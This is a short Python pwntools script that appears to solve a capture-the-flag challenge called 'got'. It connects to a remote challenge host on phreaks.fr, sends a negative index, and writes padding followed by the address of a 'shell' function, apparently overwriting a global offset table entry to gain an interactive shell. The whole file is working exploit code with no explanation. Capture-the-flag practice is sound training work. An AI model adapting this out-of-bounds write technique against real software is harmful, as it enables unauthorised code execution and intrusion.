#!/usr/bin/env python3

from pwn import *

exe = ELF("./got", checksec=False)
context.binary = exe

if args.LOCAL:
    p = process([exe.path])
    if args.DEBUG:
        gdb.attach(p)
else:
    p = remote("got-232f85cd5d9d9e46.deploy.phreaks.fr", 443, ssl=True, sni="got-232f85cd5d9d9e46.deploy.phreaks.fr")

input()

p.sendlineafter(b'> ', b'-4')
payload = b'a'*8 + p64(exe.sym['shell'])
p.sendlineafter(b'> ', payload)

p.interactive()